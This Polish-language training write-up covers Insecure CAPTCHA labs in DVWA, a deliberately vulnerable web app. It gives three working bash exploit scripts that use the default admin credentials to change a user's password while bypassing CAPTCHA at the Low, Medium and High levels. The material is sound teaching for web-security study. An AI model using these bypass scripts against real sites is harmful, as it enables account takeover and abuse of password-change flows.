# Insecure CAPTCHA
## Opis techniki
<blockquote>Insecure CAPTCHA odnosi się do błędów w implementacji mechanizmu CAPTCHA w aplikacjach webowych, które mogą zostać wykorzystane przez atakujących w celu ominięcia zastosowanych środków bezpieczeństwa. CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) to mechanizm typu wyzwanie-odpowiedź zaprojektowany w celu odróżnienia ludzi od botów.

Oto kilka cech i zagrożeń związanych z niebezpiecznymi mechanizmami CAPTCHA:

* Słabe algorytmy CAPTCHA: Niebezpieczne implementacje CAPTCHA mogą wykorzystywać słabe algorytmy lub źle zaprojektowane wyzwania, które mogą być łatwo zdeszyfrowane lub zautomatyzowane przez atakujących. Może to pozwolić botom lub zautomatyzowanym skryptom na ominięcie CAPTCHA i wykonanie złośliwych działań.
* Niewystarczająca złożoność: CAPTCHA powinna prezentować zadania, które są trudne do rozwiązania dla botów, ale stosunkowo łatwe dla ludzi. Jeśli jednak złożoność wyzwania CAPTCHA jest niewystarczająca, atakujący mogą zastosować zautomatyzowane metody lub algorytmy uczenia maszynowego w celu ominięcia CAPTCHA.
* Brak losowości: Wyzwania CAPTCHA powinny być generowane losowo, aby zapobiec przewidywalności i rozpoznawaniu wzorców przez atakujących. Niebezpieczne implementacje CAPTCHA mogą wykorzystywać statyczne lub przewidywalne wyzwania, ułatwiając atakującym opracowanie zautomatyzowanych rozwiązań.
* Brak walidacji: Po przesłaniu przez użytkownika odpowiedzi CAPTCHA serwer powinien zweryfikować poprawność rozwiązania. Niebezpieczne implementacje mogą nie przeprowadzać prawidłowej walidacji, umożliwiając atakującym przesyłanie nieprawidłowych lub złośliwych odpowiedzi, które są nadal akceptowane.</blockquote>

## DVWA labs

- [DVWA Insecure CAPTCHA #1 - Low](#dvwa-insecure-captcha-1---low)

- [DVWA Insecure CAPTCHA #2 - Medium](#dvwa-insecure-captcha-2---medium)

- [DVWA Insecure CAPTCHA #3 - High](#dvwa-insecure-captcha-3---high)


<br/>

## DVWA Insecure CAPTCHA #1 - Low
Na niskim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Nie jest sprawdzana realizacja wyzwania CAPTCHA

#### Dane wejściowe:
| No. | Opis | Typ | Przykładowa wartość |
|------|-------------|------|---------------|
| 1 | DVWA base url | url | 10.10.10.10|
| 2 | docelowe hasło | string | charlie|

#### Skrypt w `bash` 

```bash
#!/bin/bash

# Function to display usage instructions
display_usage() {
  echo "Usage: $0 <base_url> <password>"
  echo "Description: This script attempts to bypass improperly implemented captcha mechanism to change a password"
  echo "Arguments:"
  echo "  <base_url>      Base URL of the target application"
  echo "  <password>      Password you want to set"
}

# Check if the required number of arguments are provided
if [[ $# -ne 2 ]]; then
  display_usage
  exit 1
fi

get_cookie() {
  csrf=$(curl -s -x "http://127.0.0.1:8080" -c dvwa.cookie "$1/login.php?security=low&Login=Login&username=admin&password=password" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
  sed -i 's/impossible/low/' dvwa.cookie
  curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${csrf}&Login=Login" "$1/login.php"
}

exploit() {
  response=$(curl -s -x "http://127.0.0.1:8080" -b dvwa.cookie -X POST -d "step=2&password_new=$2&password_conf=$2&Change=Change" "$1/vulnerabilities/captcha/" | awk -v RS="<pre>" 'NR > 1 {gsub(/<\/pre>.*/, ""); print}')
  [[ ! -z "$response" ]] && echo "Password changed to: $2" && exit 1
}

# Check if the necessary arguments are provided
if [[ -z $1 || -z $2 ]]; then
  display_usage
  exit 1
fi

# Get cookie
get_cookie "$1"
exploit "$1" "$2"
echo "Something went wrong and the password was not changed. Check with proxy"
```

#### Efekt działania skryptu:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/captcha_low.gif "Po uruchomieniu skrypt wykonuje od razu żądanie kroku 2 (step=2). Ten krok nie wymaga realizacji wyzwania CAPTCHA, a to właśnie przez niego dokonywana jest zmiana hasła")


#### Czyszczenie pozostałości po wykonaniu skryptu:
```bash
rm ./dvwa.cookie
```


<br/>

<br/>
<br/>

## DVWA Insecure CAPTCHA #2 - Medium
Na średnim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Sprawdzenie CAPTCHA polega tylko na ustawieniu kontrolowanej przez użytkownika wartości jednego parametru w POST po pomyślnym rozwiązaniu CAPTCHA

#### Dane wejściowe:
| No. | Opis | Typ | Przykładowa wartość |
|------|-------------|------|---------------|
| 1 | DVWA base url | url | 10.10.10.10|
| 2 | docelowe hasło | string | charlie|

#### Skrypt w `bash` 

```bash
#!/bin/bash

# Function to display usage instructions
display_usage() {
  echo "Usage: $0 <base_url> <password>"
  echo "Description: This script attempts to bypass improperly implemented captcha mechanism to change a password"
  echo "Arguments:"
  echo "  <base_url>      Base URL of the target application"
  echo "  <password>      Password you want to set"
}

# Check if the required number of arguments are provided
if [[ $# -ne 2 ]]; then
  display_usage
  exit 1
fi

get_cookie() {
  csrf=$(curl -s -x "http://127.0.0.1:8080" -c dvwa.cookie "$1/login.php?security=medium&Login=Login&username=admin&password=password" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
  sed -i 's/impossible/medium/' dvwa.cookie
  curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${csrf}&Login=Login" "$1/login.php"
}

exploit() {
  response=$(curl -s -x "http://127.0.0.1:8080" -b dvwa.cookie -X POST -d "step=2&password_new=$2&password_conf=$2&passed_captcha=true&Change=Change" "$1/vulnerabilities/captcha/" | awk -v RS="<pre>" 'NR > 1 {gsub(/<\/pre>.*/, ""); print}')
  [[ ! -z "$response" ]] && echo "Password changed to: $2" && exit 1
}

# Check if the necessary arguments are provided
if [[ -z $1 || -z $2 ]]; then
  display_usage
  exit 1
fi

# Get cookie
get_cookie "$1"
exploit "$1" "$2"
echo "Something went wrong and the password was not changed. Check with proxy"

```

#### Efekt działania skryptu:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/captcha_medium.gif "Po uruchomieniu skrypt wykonuje od razu żądanie kroku 2 (step=2). Ten krok nie wymaga realizacji wyzwania CAPTCHA, a to właśnie przez niego dokonywana jest zmiana hasła. Jedyne czego wymaga, to ustawionego parametru passed_captcha na true")


#### Czyszczenie pozostałości po wykonaniu skryptu:
```bash
rm ./dvwa.cookie
```


<br/>

<br/>
<br/>

## DVWA Insecure CAPTCHA #3 - High
Na wysokim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* W tym przypadku proces zmiany hasła nie jest już rozdzielony na dwa etapy
* W kodzie strony znajduje się wyjątek/furtka pozostawiona przez dewelopera w formie komentarza. Ta furtka umożliwia pominięcie normalnego procesu weryfikacji CAPTCHA.

#### Dane wejściowe:
| No. | Opis | Typ | Przykładowa wartość |
|------|-------------|------|---------------|
| 1 | DVWA base url | url | 10.10.10.10|
| 2 | docelowe hasło | string | charlie|

#### Skrypt w `bash` 

```bash
#!/bin/bash

# Function to display usage instructions
display_usage() {
  echo "Usage: $0 <base_url> <password>"
  echo "Description: This script attempts to bypass improperly implemented captcha mechanism to change a password"
  echo "Arguments:"
  echo "  <base_url>      Base URL of the target application"
  echo "  <password>      Password you want to set"
}

# Check if the required number of arguments are provided
if [[ $# -ne 2 ]]; then
  display_usage
  exit 1
fi

get_cookie() {
  csrf=$(curl -s -x "http://127.0.0.1:8080" -c dvwa.cookie "$1/login.php?security=high&Login=Login&username=admin&password=password" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
  sed -i 's/impossible/high/' dvwa.cookie
  curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${csrf}&Login=Login" "$1/login.php"
}

exploit() {
  response=$(curl -s -x "http://127.0.0.1:8080" -b dvwa.cookie -X POST -d "step=1&password_new=$2&password_conf=$2&g-recaptcha-response=hidd3n_valu3&Change=Change" -A 'reCAPTCHA' "$1/vulnerabilities/captcha/" | awk -v RS="<pre>" 'NR > 1 {gsub(/<\/pre>.*/, ""); print}')
  [[ ! -z "$response" ]] && echo "Password changed to: $2" && exit 1
}

# Check if the necessary arguments are provided
if [[ -z $1 || -z $2 ]]; then
  display_usage
  exit 1
fi

# Get cookie
get_cookie "$1"
exploit "$1" "$2"
echo "Something went wrong and the password was not changed. Check with proxy"
```

#### Efekt działania skryptu:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/captcha_high.gif "Po uruchomieniu skrypt wykonuje żądanie zmiany hasła, wykorzystując wartości parametrów służące do debugowania, a pozostawione przez dewelopera na produkcji w formie komentarza")
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_164751123.png "Wykonane przez skrypt żądanie zmiany hasła")


#### Czyszczenie pozostałości po wykonaniu skryptu:
```bash
rm ./dvwa.cookie
```


<br/>
